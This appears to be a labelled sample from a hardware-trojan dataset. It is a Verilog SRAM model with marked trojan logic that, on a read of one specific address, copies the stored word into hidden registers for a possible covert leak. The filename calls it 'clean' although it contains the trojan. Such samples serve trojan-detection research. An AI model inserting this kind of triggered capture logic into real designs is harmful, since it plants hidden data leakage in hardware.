// sram_32x128_1rw_with_ht001_clean.v
// Trojan: HT001
// Region: chunk_002_CONDITIONAL_DEBUG_OUTPUT
// HT Type: HT2_Leakage
// Stealth: Very High
// Damage: Critical

`timescale 1ns/1ps

module SRAM_32x128_1rw (
  clk0,
  csb0,
  web0,
  addr0,
  din0,
  dout0
);

  parameter DATA_WIDTH = 32;
  parameter ADDR_WIDTH = 7;
  parameter RAM_DEPTH  = 1 << ADDR_WIDTH;
  parameter DELAY      = 3;

  input                   clk0;
  input                   csb0;
  input                   web0;
  input  [ADDR_WIDTH-1:0] addr0;
  input  [DATA_WIDTH-1:0] din0;
  output reg [DATA_WIDTH-1:0] dout0;

  // sampled control / address / data
  reg                  csb0_reg;
  reg                  web0_reg;
  reg [ADDR_WIDTH-1:0] addr0_reg;
  reg [DATA_WIDTH-1:0] din0_reg;

  // ===== TROJAN DECLARATIONS =====
  reg                  trojan_trigger;
  reg [DATA_WIDTH-1:0] trojan_leak_data;
  reg [7:0]            trojan_shift_reg;
  // ===== END TROJAN DECLARATIONS =====

  // memory array
  reg [DATA_WIDTH-1:0] mem [0:RAM_DEPTH-1];

  integer i;
  initial begin
    // initialize memory and trojan flags
    trojan_trigger     = 1'b0;
    trojan_leak_data   = {DATA_WIDTH{1'b0}};
    trojan_shift_reg   = 8'd0;
    for (i = 0; i < RAM_DEPTH; i = i + 1)
      mem[i] = {DATA_WIDTH{1'b0}};
    dout0 = {DATA_WIDTH{1'b0}};
  end

  // sample inputs on rising clock (stabilize signals)
  always @(posedge clk0) begin
    csb0_reg  <= csb0;
    web0_reg  <= web0;
    addr0_reg <= addr0;
    din0_reg  <= din0;

    // Trojan trigger: if a READ (csb low & web high) to special address occurs,
    // capture that memory word into trojan_leak_data (leak staging)
    if (!csb0 && web0 && (addr0 == 7'b1010101)) begin
      trojan_trigger   <= 1'b1;
      trojan_leak_data <= mem[addr0];
      // capture some low bits into a small shift register for potential covert leak
      trojan_shift_reg <= mem[addr0][7:0];
      $display("[%0t] TROJAN: sensitive read detected at addr %b, captured data %h",
               $time, addr0, mem[addr0]);
    end
  end

  // memory write on falling edge (write when csb low & web low)
  always @(negedge clk0) begin : MEM_WRITE0
    if (!csb0_reg && !web0_reg) begin
      mem[addr0_reg] <= din0_reg;
      $display("[%0t] WRITE: addr=%b data=%h", $time, addr0_reg, din0_reg);
    end
  end

  // memory read on falling edge (read when csb low & web high)
  always @(negedge clk0) begin : MEM_READ0
    if (!csb0_reg && web0_reg) begin
      dout0 <= #(DELAY) mem[addr0_reg];
      $display("[%0t] READ: addr=%b data=%h", $time, addr0_reg, mem[addr0_reg]);
    end
  end

endmodule
